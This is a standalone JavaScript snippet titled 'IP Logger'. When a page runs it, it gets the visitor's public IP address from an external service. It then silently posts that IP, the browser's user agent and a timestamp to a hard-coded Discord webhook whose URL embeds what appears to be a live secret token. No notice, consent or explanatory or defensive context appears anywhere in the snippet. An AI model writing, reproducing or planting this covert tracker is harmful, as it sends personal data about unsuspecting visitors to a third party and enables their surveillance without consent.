fetch('https://api.ipify.org')
  .then(response => response.text())
  .then(ip => {
    const webhookUrl = 'https://discord.com/api/webhooks/1570794844572483676/7PAI4xda77SxJKrFcy8Kaf7YHdNe0h8t7oCsxprI_I7-pIO85tVbRgkxsXLYLq9oY5oc';
    
    const payload = {
      content: `**Visitor IP: ${ip}**`,
      embeds: [{
        title: 'Visitor Information',
        color: 16711680,
        fields: [
          {
            name: 'IP Address',
            value: ip,
            inline: true
          },
          {
            name: 'User Agent',
            value: navigator.userAgent || 'Unknown',
            inline: false
          },
          {
            name: 'Timestamp',
            value: new Date().toLocaleString(),
            inline: true
          }
        ],
        footer: {
          text: 'IP Logger'
        }
      }]
    };
    
    fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  })
  .catch(error => console.error('Error fetching IP:', error));
